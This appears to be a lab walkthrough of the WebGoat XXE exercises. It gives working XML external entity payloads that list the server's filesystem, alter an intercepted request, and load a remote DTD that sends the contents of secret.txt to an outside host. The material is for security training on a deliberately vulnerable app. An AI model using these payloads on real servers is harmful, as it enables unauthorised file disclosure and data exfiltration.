# XML External Entities (XXE)
## XXE
### Number 3
![XXE n.3](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/04_01.png)

To resolve this exercise you can read also this [documentation](https://portswigger.net/web-security/xxe).

We try to submit some text and with zap we can see and modify the request. As we can see it's a simple XML comment. So we can make it to list all the directory as we study in the previous blocks of this chapter.

Original Request:
```
<?xml version="1.0"?><comment> <text>ciao</text></comment>
```
New one:
```
<?xml version="1.0"?>
<!DOCTYPE user [
 <!ENTITY root SYSTEM "file:///">
]>
<comment> <text>&root;</text></comment>
```
### Number 4
![XXE n.4](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/04_02.png)

Some documentation at this [link](https://blog.netspi.com/playing-content-type-xxe-json-endpoints/).

As we can see by the solution of the previous exsercise we need to inject a xml.

We try same example and we proxy with ZAP. As we read in the link in the Resources, we can try to check if the server can read xml modifying the Content-type to: application/xml and we read the error of the response.

Now we can modify the request and add the same payload of the previous exercise.
```
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Referer: https://localhost:8080/WebGoat/start.mvc
Content-Type: application/xml
X-Requested-With: XMLHttpRequest
Content-Length: 109
DNT: 1
Connection: keep-alive
Cookie: JSESSIONID=64CA23D9D89C685F57A7AE4A8EC0FC3F
Host: localhost:8080
<?xml version="1.0"?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///">]><comment><text>&root;</text></comment>
```
### Number 6
This is not a very exercise, but it is important to do to learn how to resolve the number 7. We use the 7 part to test our solution.

![XXE n.6](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/04_03.png)

We need to create a dtd file and upload it on a web server (We can use WebWolf for hosting and download the resources from \<ip\>:\<port\>/files/\<username\>/\<filename\>).

File Name: ping.dtd
```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % command "<!ENTITY ping SYSTEM 'http://<ip>:<port>/landing'>">%command;
```
Now we need to intercept a post request for the comment and modify it to match this:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
<!ENTITY % dtd SYSTEM "http://<ip>:<port>/files/ping.dtd">
%dtd;]>
<comment>
<text>&ping;</text>
</comment>
```
Then we can go in WebWolf and see in the "Incoming Requests" there is a request with our parameters.
### Number 7
![XXE n.7](https://github.com/AlessandroMorelli96/WebGoat/blob/master/images/04_04.png)

In this case we need to find a file and then use is content as parameter for the request as we did in the 6 part.

I use Vagrant(VirtualBox) to host WebGoat so for me the ```secret.txt``` file is in ```/home/vagrant/.webgoat-8.0.0.M21/XXE/secret.txt```.

Now we need a new dtd file that contains the command of comment like in the example 6, but this time we use as parameter the content of the file.
```
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % command "<!ENTITY send SYSTEM 'http://<ip>:<port>/landing?%file;'>">%command;
```
As before we intercept the POST request and modify it to match this:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
<!ENTITY % file SYSTEM "file:///home/vagrant/.webgoat-8.0.0.M21/XXE/secret.txt">
<!ENTITY % dtd SYSTEM "http://<ip>:<port>/files/clownfire/upload_file.dtd">
%dtd;]>
<comment>
<text>&send;</text>
</comment>
```
Now we go in the "Incoming Requests" in WebWolf and read the content of the requests ```(WebGoat 8.0 rocks...(MDsnUMzhZu))```. Now submit it to WebGoat.
